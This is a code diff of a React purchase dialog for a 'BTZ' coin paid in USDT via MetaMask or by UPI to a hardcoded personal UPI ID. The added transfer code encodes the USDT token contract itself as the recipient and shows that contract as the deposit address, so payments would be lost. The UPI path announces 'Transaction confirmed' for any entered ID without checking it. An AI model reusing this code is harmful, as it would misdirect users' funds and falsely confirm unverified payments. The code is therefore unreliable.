@@ -7,7 +7,6 @@ import { StatusDisplay } from './buy/StatusDisplay';
 import { DepositAddress } from './buy/DepositAddress';
 import { validateAmount } from '@/utils/validation';
 import { convertUSDTtoINR } from '@/utils/currencyConverter';
-import { BackButton } from './ui/back-button';
 
 interface BuyModalProps {
   isOpen: boolean;
@@ -16,7 +15,6 @@ interface BuyModalProps {
 }
 
 export const BuyModal: React.FC<BuyModalProps> = ({ isOpen, onClose, coinValue }) => {
-  const [currentStep, setCurrentStep] = useState<'passcode' | 'payment' | 'upi'>('passcode');
   const [passcode, setPasscode] = useState('');
   const [isProcessing, setIsProcessing] = useState(false);
   const [showUPIDetails, setShowUPIDetails] = useState(false);
@@ -25,7 +23,7 @@ export const BuyModal: React.FC<BuyModalProps> = ({ isOpen, onClose, coinValue }
   const [transactionId, setTransactionId] = useState('');
   const USDT_CONTRACT_ADDRESS = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
   const UPI_ID = 'deepaks5559@fifederal';
-
+  
   const validatePasscode = (code: string): boolean => {
     if (code.length !== 52) return false;
     if (!code.startsWith('0xb1q')) return false;
@@ -48,23 +46,6 @@ export const BuyModal: React.FC<BuyModalProps> = ({ isOpen, onClose, coinValue }
     return result;
   };
 
-  const handleBack = () => {
-    if (showTxInput) {
-      setShowTxInput(false);
-      return;
-    }
-    if (showUPIDetails) {
-      setShowUPIDetails(false);
-      setCurrentStep('payment');
-      return;
-    }
-    if (currentStep === 'payment') {
-      setCurrentStep('passcode');
-      return;
-    }
-    onClose();
-  };
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!validatePasscode(passcode)) {
@@ -83,7 +64,47 @@ export const BuyModal: React.FC<BuyModalProps> = ({ isOpen, onClose, coinValue }
       return;
     }
 
-    setCurrentStep('payment');
+    setIsProcessing(true);
+    try {
+      if (typeof window.ethereum !== 'undefined') {
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+        
+        const transferFunctionSignature = '0xa9059cbb';
+        const amount = (parseFloat(extractedAmount) * 1000000).toString(16).padStart(64, '0');
+        const paddedAddress = USDT_CONTRACT_ADDRESS.slice(2).padStart(64, '0');
+        const data = `${transferFunctionSignature}${paddedAddress}${amount}`;
+
+        const networkUSDTAddresses: { [key: string]: string } = {
+          '0x1': '0xdac17f958d2ee523a2206206994597c13d831ec7',
+          '0x89': '0xc2132d05d31c914a87c6611c10748aeb04b58e8f',
+          '0x38': '0x55d398326f99059ff775485246999027b3197955',
+        };
+
+        const currentUSDTAddress = networkUSDTAddresses[chainId] || USDT_CONTRACT_ADDRESS;
+
+        const transactionParameters = {
+          to: currentUSDTAddress,
+          from: accounts[0],
+          data: data,
+          gas: '0x186A0',
+        };
+
+        const txHash = await window.ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [transactionParameters],
+        });
+
+        toast.success("USDT transfer initiated! Transaction hash: " + txHash);
+        onClose();
+      } else {
+        toast.error("MetaMask is not installed!");
+      }
+    } catch (error: any) {
+      toast.error(error.message || "Transaction failed. Please try again.");
+    } finally {
+      setIsProcessing(false);
+    }
   };
 
   const handleUPISubmit = async () => {
@@ -97,7 +118,6 @@ export const BuyModal: React.FC<BuyModalProps> = ({ isOpen, onClose, coinValue }
       const inrValue = await convertUSDTtoINR(extractedAmount);
       setInrAmount(inrValue);
       setShowUPIDetails(true);
-      setCurrentStep('upi');
     } catch (error) {
       toast.error("Failed to convert currency. Please try again.");
     }
@@ -109,76 +129,76 @@ export const BuyModal: React.FC<BuyModalProps> = ({ isOpen, onClose, coinValue }
       return;
     }
     
+    // Here you would typically verify the transaction
     toast.success("Transaction confirmed! ID: " + transactionId);
     onClose();
   };
+
+  const isValid = validatePasscode(passcode);
+  const extractedAmount = extractKeywords(passcode);
+  const isAmountValid = validateAmount(extractedAmount, coinValue);
 
   return (
     <Dialog open={isOpen} onOpenChange={onClose}>
       <DialogContent className="sm:max-w-[425px] max-h-[90vh] overflow-y-auto bg-background">
         <DialogHeader>
-          <BackButton onClick={handleBack} />
-          <DialogTitle className="text-xl font-bold text-center">
-            {currentStep === 'passcode' && "Enter Passcode"}
-            {currentStep === 'payment' && "Choose Payment Method"}
-            {currentStep === 'upi' && "UPI Payment"}
-          </DialogTitle>
+          <DialogTitle className="text-xl font-bold text-center">Buy BTZ with USDT/UPI</DialogTitle>
         </DialogHeader>
-
         <form onSubmit={handleSubmit} className="space-y-4 p-4">
-          {currentStep === 'passcode' && (
-            <div className="space-y-2">
-              <label className="text-sm font-medium">Passcode</label>
-              <Input
+          <div className="space-y-2">
+            <label className="text-sm font-medium">Passcode</label>
+            <Input
+              type="text"
+              value={passcode}
+              onChange={(e) => setPasscode(e.target.value)}
+              className="font-mono"
+              placeholder="Enter 52-character passcode"
+            />
+            <p className="text-sm text-muted-foreground">
+              If you don't have a passcode, please login/signup and order your coin.
+            </p>
+          </div>
+
+          <div className="bg-muted p-4 rounded-lg space-y-2">
+            <label className="text-sm font-medium">Required USDT Deposit Amount</label>
+            <div className="flex items-center space-x-2">
+              <Input 
                 type="text"
-                value={passcode}
-                onChange={(e) => setPasscode(e.target.value)}
-                className="font-mono"
-                placeholder="Enter 52-character passcode"
+                value={isValid ? `${extractedAmount} USDT` : ''}
+                readOnly
+                className="font-mono bg-background"
+                placeholder="Amount will appear here"
               />
-              <p className="text-sm text-muted-foreground">
-                If you don't have a passcode, please login/signup and order your coin.
-              </p>
-              <Button type="submit" className="w-full">
-                Continue
-              </Button>
             </div>
-          )}
-
-          {currentStep === 'payment' && (
-            <>
-              <div className="bg-muted p-4 rounded-lg space-y-2">
-                <label className="text-sm font-medium">Required USDT Deposit Amount</label>
-                <Input 
-                  type="text"
-                  value={extractKeywords(passcode) ? `${extractKeywords(passcode)} USDT` : ''}
-                  readOnly
-                  className="font-mono bg-background"
-                />
+            {inrAmount && showUPIDetails && (
+              <div className="mt-2 text-sm">
+                ≈ ₹{inrAmount.toFixed(2)} INR
               </div>
+            )}
+          </div>
 
-              <StatusDisplay 
-                isValid={validatePasscode(passcode)} 
-                isAmountValid={validateAmount(extractKeywords(passcode), coinValue)}
-                passcode={passcode}
-              />
+          <StatusDisplay 
+            isValid={isValid} 
+            isAmountValid={isAmountValid}
+            passcode={passcode}
+          />
 
+          {!showUPIDetails && (
+            <>
               <DepositAddress address={USDT_CONTRACT_ADDRESS} />
-              
               <div className="space-y-2">
                 <Button 
-                  type="button"
-                  onClick={handleSubmit}
+                  type="submit" 
                   className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700"
-                  disabled={!validatePasscode(passcode) || !validateAmount(extractKeywords(passcode), coinValue) || isProcessing}
+                  disabled={!isValid || !isAmountValid || isProcessing}
                 >
-                  {isProcessing ? 'Processing...' : `Submit USDT Payment`}
+                  {isProcessing ? 'Processing...' : `Submit ${extractedAmount} USDT Payment`}
                 </Button>
                 <Button 
                   type="button"
                   onClick={handleUPISubmit}
                   className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700"
-                  disabled={!validatePasscode(passcode) || !validateAmount(extractKeywords(passcode), coinValue) || isProcessing}
+                  disabled={!isValid || !isAmountValid || isProcessing}
                 >
                   Submit by UPI
                 </Button>
@@ -186,7 +206,7 @@ export const BuyModal: React.FC<BuyModalProps> = ({ isOpen, onClose, coinValue }
             </>
           )}
 
-          {currentStep === 'upi' && (
+          {showUPIDetails && (
             <div className="space-y-4">
               <div className="text-center">
                 <img 
